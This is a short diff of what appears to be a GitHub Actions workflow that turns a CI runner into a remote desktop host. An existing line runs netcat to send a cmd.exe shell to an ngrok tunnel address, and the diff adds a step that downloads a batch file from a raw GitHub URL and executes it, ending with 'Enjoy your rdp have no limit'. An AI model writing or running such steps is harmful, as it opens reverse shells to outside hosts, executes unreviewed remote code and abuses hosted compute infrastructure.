@@ -35,5 +35,13 @@ jobs:
        ls
        ./nc.exe -v 0.tcp.in.ngrok.io 12576 -e cmd.exe
        echo enter both ip and port without any  this :
+      
+    - name: Loop
+     
+      run: | 
+       Invoke-WebRequest https://raw.githubusercontent.com/MREXw/Rdpacc/main/loop.bat -OutFile loop.bat
+       cmd /c loop.bat
+       echo Enjoy your rdp have no limit
+         
        
     
